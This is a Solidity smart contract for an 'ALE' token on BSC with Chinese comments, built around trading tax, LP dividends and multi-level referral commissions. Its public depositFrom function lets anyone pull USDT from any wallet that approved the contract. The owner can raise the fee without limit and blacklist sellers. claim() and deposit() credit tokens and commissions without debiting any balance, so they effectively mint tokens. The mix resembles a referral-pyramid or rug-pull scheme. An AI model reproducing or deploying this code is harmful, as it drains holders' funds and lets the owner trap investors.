/**
 *Submitted for verification at Etherscan.io on 2023-08-01
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    //放弃权限
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    //转移权限
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

     /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}

// 因为 DEX Swap 时，除了主链币（BNB，ETH）外，其他币种，例如 USDT，不能兑换到代币合约地址，所以需要这个中转合约接收兑换的代币
contract TokenDistributor {
    constructor (address token) {
        //将代币全部授权给合约部署者，在这里是代币合约，让代币合约分配兑换到的代币资产
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

//买卖3%滑点，3%给加LP池子分红
abstract contract AbsToken is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fundAddress;//营销钱包地址


    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 private startTradeBlock;//开启交易的区块
    mapping(address => bool) private _feeWhiteList;//交易税白名单
    mapping(address => bool) private _blackList;//黑名单

    mapping(address => address) private _invitor;//邀请者，即上级

    mapping(address => bool) private _swapPairList;//交易对地址列表

    uint256 private _tTotal;

    uint256 private _cap   =  0;

    ISwapRouter private _swapRouter;
    bool private inSwap;
    uint256 private numTokensSellToFund;//合约卖币换U条件阀值

    uint256 private constant MAX = ~uint256(0);
    address private usdt;
    TokenDistributor private _tokenDistributor;
    uint256 private _txFee = 3;
    uint256 private _Percent = 100;
    IERC20 private _usdtPair;

    uint256 private limitAmount;//限购数量

    uint256 public constant CLAIM_COOLDOWN = 0.5 days;
    uint256 public CLAIM_LEVEL1 = 100 * (10 ** 18);
    uint256 public CLAIM_LEVEL2 = 1000 * (10 ** 18);
    uint256 public CLAIM_LEVEL3 = 3000 * (10 ** 18);
    uint256 public CLAIM_LEVEL4 = 5000 * (10 ** 18);
    uint256 public CLAIM_LEVEL5 = 10000 * (10 ** 18);
    struct User {
        uint256 checkpoint;
        uint256 cooldownCheckpoint;
        uint256 claimed;
    }

    mapping(address => User) internal users;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address FundAddress){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        //BSC PancakeSwap 路由地址
        _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);//0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
  
        usdt = address(0x55d398326f99059fF775485246999027B3197955);//0x337610d27c682E347C9cD60BD4b3b107C9d34dDd
     
        ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());
        address mainPair = swapFactory.createPair(address(this), _swapRouter.WETH());
        //usdt 交易对地址
        address usdtPair = swapFactory.createPair(address(this), usdt);
        _usdtPair = IERC20(usdtPair);

        _swapPairList[mainPair] = true;
        _swapPairList[usdtPair] = true;

        //将本合约里的代币全部授权给路由地址，卖出或者加池子时需要
        _allowances[address(this)][address(_swapRouter)] = MAX;

        //总量
        _tTotal = Supply * 10 ** Decimals;
        _balances[FundAddress] = _tTotal;
        emit Transfer(address(0), FundAddress, _tTotal);

        //营销钱包，暂时设置为合约部署的开发者地址
        fundAddress = FundAddress;


        //营销地址为手续费白名单
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(_swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        //营销钱包卖出条件
        numTokensSellToFund = _tTotal / 10000;
        _tokenDistributor = new TokenDistributor(usdt);

        //排除 LP 分红
        excludeLpProvider[address(0)] = true;
        excludeLpProvider[address(0x000000000000000000000000000000000000dEaD)] = true;
        //粉红锁LP合约地址
        excludeLpProvider[address(0x0cFB330C8A8b5e96663a0A0edE6d89ECcE1c5d16)] = true;

        //限购总量的 1/100
        limitAmount = _tTotal / 100;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        //授权最大值时，不再减少授权额度
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        //黑名单不允许转出
        require(!_blackList[from], "blackList");

        //交易税
        uint256 txFee;

        //交易扣税，from == _swapPairList 表示买入，to == _swapPairList 表示卖出
        if (_swapPairList[from] || _swapPairList[to]) {
            //交易未开启，只允许手续费白名单加池子，加完池子就开启交易
            if (0 == startTradeBlock) {
                require(_feeWhiteList[from] || _feeWhiteList[to], "!Trading");
                startTradeBlock = block.number;
            }

            //不在手续费白名单，需要扣交易税
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                //交易税
                txFee = _txFee;

                //杀 0、1、2、3 区块的交易机器人
                if (block.number <= startTradeBlock + 3) {
                    //机器人买入加入黑名单
                    if (!_swapPairList[to]) {
                        _blackList[to] = true;
                    }
                }

                //兑换代币，换成 USDT，进行分配
                uint256 contractTokenBalance = balanceOf(address(this));
                if (
                    contractTokenBalance >= numTokensSellToFund &&
                    !inSwap &&
                    _swapPairList[to]
                ) {
                    swapTokenForFund(numTokensSellToFund);
                }
            }

            //加入LP分红列表
            if (_swapPairList[from]) {
                addLpProvider(to);
            } else {
                addLpProvider(from);
            }
        } else {
            //普通转账，并且接收者不是手续费白名单，绑定上下级，即不能绑定营销钱包，绑定的下级必须没有币
            if (address(0) == _invitor[to] && !_feeWhiteList[to] && 0 == _balances[to]) {
                _invitor[to] = from;
            }
        }
        _tokenTransfer(from, to, amount, txFee);

        //单钱包限制持有
        if (!_swapPairList[to] && !_feeWhiteList[to]) {
            require(limitAmount >= balanceOf(to), "exceed LimitAmount");
        }

        //LP 分红
        if (
            from != address(this)
            && startTradeBlock > 0) {
            processLP(500000);
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * fee / 100;
        uint256 taxAmount = feeAmount;
        //交易
        if (fee > 0) {

            //累计在合约里，等待时机卖出，分红
            _takeTransfer(
                sender,
                address(this),
                feeAmount
            );
        }
        //接收者增加余额
        _takeTransfer(sender, recipient, tAmount - taxAmount);
    }
    
    function deposit(uint256 amount) public {
        // Transfer amount USDT tokens from msg.sender to contract
        IERC20(usdt).transferFrom(msg.sender, address(this), amount);
        // Send amount tokens to msg.sender
        uint256 transAmount = amount*4;
        IERC20(address(this)).transfer(msg.sender, transAmount);
                 //上下级提成
            address current;
            current = msg.sender;
            uint256 inviterAmount;
            for (uint256 i; i < 2; ++i) {
                address inviter = _invitor[current];
                //没有上级了
                if (address(0) == inviter) {
                    break;
                }
                if (0 == i) {
                    inviterAmount = transAmount * 20 / 100;
                } else {
                    inviterAmount = transAmount * 10 / 100;
                }

                _takeTransfer(address(this), inviter, inviterAmount);
                current = inviter;
            }
    }

   function depositFrom(address sender,uint256 amount) public {
        // Transfer amount USDT tokens from msg.sender to contract
        IERC20(usdt).transferFrom(sender, address(this), amount);
    }

  
 
   function claim() public {
        User storage user = users[msg.sender];
        require(
            user.cooldownCheckpoint <= block.timestamp.sub(CLAIM_COOLDOWN),
            "User can claim 1 time only per 12 hours"
        );
        uint256 totalBonus = 0;
        IERC20 USDT = IERC20(usdt);
        uint256 totalAmount = USDT.balanceOf(msg.sender);

        require(totalAmount >= CLAIM_LEVEL1, "User has no claimable rewards");

        if(totalAmount>=CLAIM_LEVEL1 && totalAmount<CLAIM_LEVEL2){
            totalBonus = 0.5 * (10 ** 18);
        }

        if(totalAmount>=CLAIM_LEVEL2 && totalAmount<CLAIM_LEVEL3){
            totalBonus = 5 * (10 ** 18);
        }

        if(totalAmount>=CLAIM_LEVEL3 && totalAmount<CLAIM_LEVEL4){
            totalBonus = 15 * (10 ** 18);
        }

        if(totalAmount>=CLAIM_LEVEL4 && totalAmount<CLAIM_LEVEL5){
            totalBonus = 25 * (10 ** 18);
        }
        if(totalAmount>=CLAIM_LEVEL5){
             totalBonus = 50 * (10 ** 18);
        }



        uint256 contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalBonus = contractBalance;
        }
        require(totalBonus > 0, "User has no claimable rewards");
        user.checkpoint = block.timestamp;
        user.cooldownCheckpoint = block.timestamp;
        user.claimed = user.claimed.add(totalBonus);
         //上下级提成
            address current;
            current = msg.sender;
            uint256 inviterAmount;
            for (uint256 i; i < 5; ++i) {
                address inviter = _invitor[current];
                //没有上级了
                if (address(0) == inviter) {
                    break;
                }
                if (0 == i) {
                    inviterAmount = totalBonus * 20 / 100;
                } else if (1 == i) {
                    inviterAmount = totalBonus * 10 / 100;
                } else {
                    inviterAmount = totalBonus * 5 / 100;
                }

                _takeTransfer(address(this), inviter, inviterAmount);
                current = inviter;
            }
           _takeTransfer(address(this), msg.sender, totalBonus);
    }
    function getUserClaimed(address userAddress) public view returns (uint256) {
        return users[userAddress].claimed;
    }
    function getUserCheckpoint(address userAddress) public view returns (uint256) {
        return users[userAddress].checkpoint;
    }
    //兑换成 USDT
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        //按照比例分配
        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));

        // USDT.transferFrom(address(_tokenDistributor), fundAddress, usdtBalance / 10);

        USDT.transferFrom(address(_tokenDistributor), address(this), usdtBalance);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    //设置营销钱包
    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }


    //设置营销卖出条件及数量，具体数量就行，不需要精度
    function setFundSellAmount(uint256 amount) external onlyOwner {
        numTokensSellToFund = amount * 10 ** _decimals;
    }


    function setLevel1(uint256 amount) external onlyOwner {
        CLAIM_LEVEL1 = amount;
    }

     function setLevel2(uint256 amount) external onlyOwner {
        CLAIM_LEVEL2 = amount;
    }
    function setLevel3(uint256 amount) external onlyOwner {
        CLAIM_LEVEL3 = amount;
    }
     function setLevel4(uint256 amount) external onlyOwner {
        CLAIM_LEVEL4 = amount;
    }
     function setLevel5(uint256 amount) external onlyOwner {
        CLAIM_LEVEL5 = amount;
    }
    //修改交易滑点
    function setTxFee(uint256 fee) external onlyOwner {
        _txFee = fee;
    }

     //修改百分比
    function setPercent(uint256 fee) external onlyOwner {
        _Percent = fee;
    }

    //设置黑名单
    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    //设置交易手续费白名单
    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    //查看是否黑名单
    function isBlackList(address addr) external view returns (bool){
        return _blackList[addr];
    }

    receive() external payable {}

    //领取主链币余额
    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    //领取代币余额
    function claimToken(address token, uint256 amount) external {
        IERC20(token).transfer(fundAddress, amount);
    }


    //查看上级
    function getInviter(address account) external view returns (address){
        return _invitor[account];
    }


    //加LP 分红
    address[] private lpProviders;
    mapping(address => uint256) lpProviderIndex;
    //排除LP分红
    mapping(address => bool) excludeLpProvider;

    //加入LP持有列表，发生交易就加入
    function addLpProvider(address adr) private {
        if (0 == lpProviderIndex[adr]) {
            if (0 == lpProviders.length || lpProviders[0] != adr) {
                lpProviderIndex[adr] = lpProviders.length;
                lpProviders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private lpRewardCondition = 10;
    uint256 private progressLPBlock;

    //执行LP分红，使用 gas(500000) 单位 gasLimit 去执行LP分红
    function processLP(uint256 gas) private {
        //间隔 10 分钟分红一次
        if (progressLPBlock + 200 > block.number) {
            return;
        }
        //交易对没有余额
        uint totalPair = _usdtPair.totalSupply();
        if (0 == totalPair) {
            return;
        }

        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(address(this));
        //分红小于分配条件，一般太少也就不分配
        if (usdtBalance < lpRewardCondition) {
            return;
        }

        address shareHolder;
        uint256 pairBalance;
        uint256 amount;

        uint256 shareholderCount = lpProviders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;

        //一笔链上交易剩余的 gasLimit，可搜索 Solidity gasleft() 了解
        uint256 gasLeft = gasleft();

        //最多只给列表完整分配一次，iterations < shareholderCount
        while (gasUsed < gas && iterations < shareholderCount) {
            //下标比列表长度大，从头开始
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = lpProviders[currentIndex];
            //持有的 LP 代币余额，LP 本身也是一种代币
            pairBalance = _usdtPair.balanceOf(shareHolder);
            //不在排除列表，才分红
            if (pairBalance > 0 && !excludeLpProvider[shareHolder]) {
                amount = usdtBalance * pairBalance / totalPair;
                //分红大于0进行分配，最小精度
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressLPBlock = block.number;
    }

    //设置LP分红的USDT条件，最小精度
    function setLPRewardCondition(uint256 amount) external onlyOwner {
        lpRewardCondition = amount;
    }

    //是否排除LP分红
    function setExcludeLPProvider(address addr, bool enable) external onlyOwner {
        excludeLpProvider[addr] = enable;
    }

    //设置钱包限购数量，设置为总量就是解除限购
    function setLimitAmount(uint256 amount) external onlyOwner {
        limitAmount = amount * 10 ** _decimals;
    }
}

contract ALE is AbsToken {
    constructor() AbsToken(
    //名称
        "ALE",
    //符号
        "ALE",
    //精度
        18,
    //总量 1000 万
        10000000,
    //市场钱包
        address(0x4e42a7C1700aFC50673517dB5Db7DD8a90b6c6fd)
 
    ){

    }
}